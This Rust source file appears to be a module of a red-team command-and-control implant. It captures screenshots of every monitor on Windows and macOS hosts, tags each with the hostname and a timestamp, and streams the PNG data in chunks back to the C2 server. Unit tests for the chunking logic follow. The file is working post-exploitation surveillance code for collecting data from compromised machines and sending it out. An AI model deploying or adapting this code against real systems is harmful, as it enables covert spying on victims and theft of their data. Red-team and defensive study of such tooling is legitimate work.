use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};

#[cfg(any(test, target_os = "windows", target_os = "macos"))]
use {
    alloc::string::{String, ToString},
    alloc::vec::Vec,
    pb::c2::report_file_request,
    pb::{c2, eldritch},
};

#[cfg(any(target_os = "windows", target_os = "macos"))]
use {alloc::format, image::ImageFormat, std::io::Cursor, xcap::Monitor};

#[cfg(any(target_os = "windows", target_os = "macos"))]
const CHUNK_SIZE: usize = 1024 * 1024; // 1 MiB

#[cfg(target_os = "macos")]
fn get_hostname() -> String {
    nix::unistd::gethostname()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(target_os = "windows")]
fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(any(test, target_os = "windows", target_os = "macos"))]
fn stream_screenshot_with<F>(
    context_val: &Option<report_file_request::Context>,
    filename: String,
    png_data: Vec<u8>,
    chunk_size: usize,
    send_stream: F,
) -> Result<(), String>
where
    F: FnOnce(std::sync::mpsc::Receiver<c2::ReportFileRequest>) -> Result<(), String>,
{
    if png_data.is_empty() {
        return Err("captured empty screenshot image".to_string());
    }

    // Use a sync channel with bound 1 to provide backpressure.
    let (tx, rx) = std::sync::mpsc::sync_channel(1);
    let total_size = png_data.len();

    std::thread::scope(|s| {
        s.spawn(move || {
            let mut filename = Some(filename);
            for chunk in png_data.chunks(chunk_size) {
                let metadata = filename.take().map(|path| eldritch::FileMetadata {
                    path,
                    size: total_size as u64,
                    ..Default::default()
                });

                let file_msg = eldritch::File {
                    metadata,
                    chunk: chunk.to_vec(),
                };

                let req = c2::ReportFileRequest {
                    context: context_val.clone(),
                    chunk: Some(file_msg),
                    kind: c2::ReportFileKind::Screenshot as i32,
                };

                if tx.send(req).is_err() {
                    break;
                }
            }
        });

        send_stream(rx)
    })
}

#[cfg(not(any(target_os = "windows", target_os = "macos")))]
pub fn screenshot(_agent: Arc<dyn Agent>, _context: Context) -> Result<(), String> {
    Err(
        "This OS isn't supported by the screenshot function.\nOnly windows and mac systems are supported"
            .to_string(),
    )
}

#[cfg(any(target_os = "windows", target_os = "macos"))]
pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let monitors = Monitor::all().map_err(|e| e.to_string())?;

    if monitors.is_empty() {
        return Err("no monitors found to capture screenshot".to_string());
    }

    let hostname = get_hostname();
    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    for (i, monitor) in monitors.iter().enumerate() {
        // Capture image
        let image = monitor.capture_image().map_err(|e| e.to_string())?;

        // Convert to PNG
        let mut buffer = Cursor::new(Vec::new());
        image
            .write_to(&mut buffer, ImageFormat::Png)
            .map_err(|e| e.to_string())?;
        let png_data = buffer.into_inner();

        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, i);

        stream_screenshot_with(&context_val, filename, png_data, CHUNK_SIZE, |rx| {
            agent.report_file(rx).map(|_| ())
        })?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stream_screenshot_chunks_and_metadata() {
        let ctx = Some(report_file_request::Context::TaskContext(c2::TaskContext {
            task_id: 42,
            jwt: "jwt-token".to_string(),
        }));
        let payload = b"0123456789".to_vec();
        let mut received = Vec::new();

        let res = stream_screenshot_with(
            &ctx,
            "screenshot_host_1_0.png".to_string(),
            payload.clone(),
            4,
            |rx| {
                for req in rx {
                    received.push(req);
                }
                Ok(())
            },
        );
        assert!(res.is_ok());
        assert_eq!(received.len(), 3);

        // First chunk carries metadata without fabricated Unix owner/permissions.
        let first_file = received[0].chunk.as_ref().unwrap();
        let meta = first_file.metadata.as_ref().unwrap();
        assert_eq!(meta.path, "screenshot_host_1_0.png");
        assert_eq!(meta.size, payload.len() as u64);
        assert!(meta.owner.is_empty());
        assert!(meta.group.is_empty());
        assert!(meta.permissions.is_empty());
        assert_eq!(received[0].kind, c2::ReportFileKind::Screenshot as i32);

        // Subsequent chunks omit metadata.
        assert!(received[1].chunk.as_ref().unwrap().metadata.is_none());
        assert!(received[2].chunk.as_ref().unwrap().metadata.is_none());

        // Reassembled payload matches original bytes.
        let reassembled: Vec<u8> = received
            .into_iter()
            .flat_map(|r| r.chunk.unwrap().chunk)
            .collect();
        assert_eq!(reassembled, payload);
    }

    #[test]
    fn test_stream_screenshot_empty_payload_errors() {
        let res = stream_screenshot_with(&None, "empty.png".to_string(), Vec::new(), 4, |_| Ok(()));
        assert!(res.is_err());
    }

    #[test]
    fn test_stream_screenshot_receiver_drop_joins_cleanly() {
        let payload = vec![0xAB; 16];
        let res = stream_screenshot_with(&None, "abort.png".to_string(), payload, 4, |rx| {
            let _first = rx.recv().unwrap();
            drop(rx);
            Err("aborted".to_string())
        });
        assert_eq!(res, Err("aborted".to_string()));
    }
}
